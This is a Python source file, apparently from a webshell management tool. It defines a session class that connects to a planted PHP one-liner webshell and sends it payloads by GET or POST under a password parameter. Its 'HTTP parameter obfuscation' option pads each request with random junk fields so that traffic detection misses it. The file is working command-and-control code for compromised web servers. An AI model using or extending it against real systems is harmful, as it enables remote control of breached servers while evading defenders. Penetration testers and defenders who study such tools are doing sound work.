import random
import typing as t
import httpx

from .. import exceptions

from ...utils import random_english_words, random_data
from ..base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)
from ..php import PHPWebshell, php_webshell_conn_options


@register_session
class PHPWebshellOneliner(PHPWebshell):
    """一句话的php webshell"""

    session_type = "ONELINE_PHP"
    readable_name = "PHP一句话"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="method",
                    name="请求方法",
                    type="select",
                    placeholder="POST",
                    default_value="POST",
                    alternatives=[
                        {"name": "POST", "value": "POST"},
                        {"name": "GET", "value": "GET"},
                    ],
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value=None,
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="http_params_obfs",
                    name="HTTP参数混淆",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_conn_options,
        },
    ]

    def __init__(self, session_conn: dict) -> None:
        super().__init__(
            session_conn
        )
        self.method = session_conn["method"].upper()
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.params = {}
        self.data = {}
        self.http_params_obfs = session_conn["http_params_obfs"]
        self.client = get_http_client()

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        params = self.params.copy()
        data = self.data.copy()
        obfs_data = {}
        if self.http_params_obfs:
            obfs_data = {
                random_english_words(): random_data()
                for _ in range(random.randint(8, 12))
            }
        if self.method in ["GET", "HEAD"]:
            params[self.password] = payload
            params.update(obfs_data)
        else:
            data[self.password] = payload
            data.update(obfs_data)
        try:
            response = await self.client.request(
                method=self.method, url=self.url, params=params, data=data
            )
            print(response.text)
            return response.status_code, response.text

        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
